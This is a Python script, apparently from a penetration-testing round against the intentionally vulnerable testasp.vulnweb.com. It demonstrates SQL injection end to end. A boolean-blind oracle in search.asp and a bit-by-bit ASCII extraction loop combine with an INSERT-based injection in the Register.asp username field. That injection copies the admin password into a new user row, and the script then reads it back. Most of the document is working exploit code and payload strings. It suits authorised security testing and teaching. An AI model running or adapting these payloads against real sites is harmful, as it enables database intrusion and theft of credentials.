#!/usr/bin/env python3
"""Round 13 — Register.asp INSERT 기반 SQLi 검증 (사용자 승인 완료).

구조:
  1) 사전 상태 측정(읽기 전용 오라클) + 무결성 기준값
  2) 기준선: 정상 회원가입 1건 (회원가입 기능 자체의 동작 확인)
  3) 주입: tfUName 에 서브쿼리를 끼워 INSERT 의 값 목록을 조작
  4) 교차검증: 읽기 전용 오라클로 행 실존 + avatar 값이 서브쿼리 결과와 같은지 + 값 추출
  5) 무결성: 기존 데이터(게시글/스레드) 불변 확인
쓰기 발생: 회원가입 행 2건(기준선 1 + 주입 1). DELETE/UPDATE 시도 없음.
"""
import json
import time
import urllib.error
import urllib.parse
import urllib.request

BASE = "http://testasp.vulnweb.com"
SEARCH = BASE + "/search.asp"
REQ = {"n": 0}
LOG = []


def log(*a):
    line = " ".join(str(x) for x in a)
    print(line, flush=True)
    LOG.append(line)


def get(path, timeout=30):
    REQ["n"] += 1
    try:
        with urllib.request.urlopen(BASE + path, timeout=timeout) as r:
            return r.status, r.read().decode("latin-1", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("latin-1", "replace")


def post(path, fields, timeout=30):
    REQ["n"] += 1
    data = urllib.parse.urlencode(fields).encode()
    req = urllib.request.Request(BASE + path, data=data, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.geturl()
    except urllib.error.HTTPError as e:
        return e.code, None


def oracle(cond):
    """search.asp boolean-blind: True / False / None"""
    st = "zzq')>0 OR (" + cond + "))--"
    url = SEARCH + "?tfSearch=" + urllib.parse.quote(st, safe="")
    REQ["n"] += 1
    for _ in range(2):
        try:
            with urllib.request.urlopen(url, timeout=30) as r:
                return "class='posttext'" in r.read().decode("latin-1", "replace")
        except urllib.error.HTTPError as e:
            if e.code == 500:
                return None
            return "class='posttext'" in e.read().decode("latin-1", "replace")
        except Exception:
            time.sleep(1.0)
    return None


def extract(expr, n):
    out = ""
    for i in range(1, n + 1):
        lo, hi = 1, 126
        while lo < hi:
            mid = (lo + hi) // 2
            r = oracle(f"(SELECT ASCII(SUBSTRING(({expr}),{i},1)))>{mid}")
            if r is True:
                lo = mid + 1
            elif r is False:
                hi = mid
            else:
                return out + "<?>"
        if lo <= 1:
            break
        out += chr(lo)
    return out


ADMIN_PW_EXPR = "(SELECT TOP 1 upass FROM users WHERE uname='admin')"
out = {"round": 13, "requests": 0, "writes": [], "checks": {}}

# ---------- 1. 사전 상태 ----------
log("### 1. 사전 상태 (읽기 전용)")
pre_rt12 = oracle("(SELECT COUNT(*) FROM users WHERE uname='rt12x')>0")
pre_rt12test = oracle("(SELECT COUNT(*) FROM users WHERE uname='RT12TEST')>0")
log(f"  사전 users 에 rt12x 존재?      {pre_rt12}   (False 기대)")
log(f"  사전 users 에 RT12TEST 존재?   {pre_rt12test}   (False 기대)")
st, body = get("/Default.asp")
pre_posts = body.count("class='posttext'") + body.count("posttext")
pre_thread = get("/showthread.asp?id=9")
pre_thread_posts = pre_thread[1].count("class='posttext'")
log(f"  Default.asp 포럼 카운트 마커={pre_posts} / 스레드9 게시글={pre_thread_posts}")
out["checks"]["pre"] = {"rt12x_exists": pre_rt12, "rt12test_exists": pre_rt12test,
                        "default_markers": pre_posts, "thread9_posts": pre_thread_posts}

# ---------- 2. 기준선: 정상 회원가입 ----------
log("\n### 2. 기준선 — 정상 회원가입 1건 (쓰기 #1)")
st, url = post("/Register.asp", {"tfUName": "RT12TEST", "tfUPass": "RT12pass",
                                 "tfEmail": "rt12@example.invalid", "tfRName": "RT12 Test"})
log(f"  POST /Register.asp  → {st} redirect={url}")
out["writes"].append({"what": "normal registration", "uname": "RT12TEST", "status": st, "redirect": url})

time.sleep(1)
ok_login = oracle("(SELECT COUNT(*) FROM users WHERE uname='RT12TEST')>0")
log(f"  오라클: users 에 RT12TEST 실존? {ok_login}   (True 기대)")
out["checks"]["baseline_row_created"] = ok_login

# ---------- 3. 주입: INSERT 값 목록 조작 ----------
log("\n### 3. 주입 — tfUName 으로 서브쿼리를 INSERT 값 목록에 삽입 (쓰기 #2)")
payload = "rt12x', 'p', 'e', 'r', " + ADMIN_PW_EXPR + ")--"
log(f"  payload tfUName = {payload}")
st, url = post("/Register.asp", {"tfUName": payload, "tfUPass": "x",
                                 "tfEmail": "x", "tfRName": "x"})
log(f"  POST /Register.asp  → {st} redirect={url}")
out["writes"].append({"what": "injected registration", "uname_payload": payload,
                      "status": st, "redirect": url})

time.sleep(1)

# ---------- 4. 교차검증 ----------
log("\n### 4. 교차검증 (읽기 전용 오라클)")
c1 = oracle("(SELECT COUNT(*) FROM users WHERE uname='rt12x')>0")
log(f"  주입 행 rt12x 실존?                          {c1}   (True ⇒ INSERT 성공)")
c2 = oracle(f"(SELECT avatar FROM users WHERE uname='rt12x')={ADMIN_PW_EXPR}")
log(f"  avatar 가 서브쿼리 결과와 동일?              {c2}   (True ⇒ ★ 값 목록 안에서 서브쿼리가 실행됨)")
c3 = oracle("(SELECT email FROM users WHERE uname='rt12x')='e'")
log(f"  email='e' (지정값 그대로)?                   {c3}")
c4 = oracle("(SELECT realname FROM users WHERE uname='rt12x')='r'")
log(f"  realname='r' (지정값 그대로)?                {c4}")
c5 = oracle("(SELECT COUNT(*) FROM users WHERE uname='rt12x')=1")
log(f"  주입 행이 정확히 1건?                        {c5}")

avatar_val = extract("(SELECT avatar FROM users WHERE uname='rt12x')", 12) if c1 else None
log(f"  ★ avatar 값(쓰기→읽기 체인) = {avatar_val!r}")
out["checks"]["injection"] = {"row_exists": c1, "avatar_equals_subquery": c2,
                              "email_ok": c3, "realname_ok": c4, "exactly_one_row": c5,
                              "avatar_extracted": avatar_val}

# ---------- 5. 무결성 ----------
log("\n### 5. 기존 데이터 무결성 (쓰기 전후 비교)")
st, body = get("/Default.asp")
post_posts = body.count("class='posttext'") + body.count("posttext")
th = get("/showthread.asp?id=9")
post_thread_posts = th[1].count("class='posttext'")
log(f"  Default.asp 마커 {pre_posts} → {post_posts}")
log(f"  스레드9 게시글  {pre_thread_posts} → {post_thread_posts}")
log(f"  게시글 총수 오라클 25 초과? {oracle('(SELECT COUNT(*) FROM posts)>25')}  (False 기대 — 삭제 없음)")
out["checks"]["integrity"] = {"default_markers": [pre_posts, post_posts],
                              "thread9_posts": [pre_thread_posts, post_thread_posts],
                              "posts_gt_25": oracle("(SELECT COUNT(*) FROM posts)>25")}

# ---------- 6. 주입 없이 같은 곳에 정상 등록이 가능한지(대조: 페이로드 없이도 행 생성) ----------
log("\n### 6. 대조 — 같은 이름을 페이로드 없이 등록하면?")
st, url = post("/Register.asp", {"tfUName": "rt12ctrl", "tfUPass": "p",
                                 "tfEmail": "e2", "tfRName": "r2"})
log(f"  POST(정상값) → {st}")
c6 = oracle("(SELECT COUNT(*) FROM users WHERE uname='rt12ctrl')>0")
log(f"  대조 행 rt12ctrl 실존? {c6}")
c7 = oracle("(SELECT avatar FROM users WHERE uname='rt12ctrl')=''")
log(f"  대조 행 avatar 는 빈 문자열? {c7}   (True ⇒ 'avatar=빈 값' 이 정상 형태이고, 주입 행만 값이 들어감)")
out["checks"]["control"] = {"row_exists": c6, "avatar_empty": c7}

out["requests"] = REQ["n"]
with open("out/register_sqli.json", "w", encoding="utf-8") as f:
    json.dump(out, f, ensure_ascii=False, indent=2)
log(f"\n### 완료 — 총 요청 {REQ['n']}건 (쓰기 3건: 기준선·주입·대조) → out/register_sqli.json")
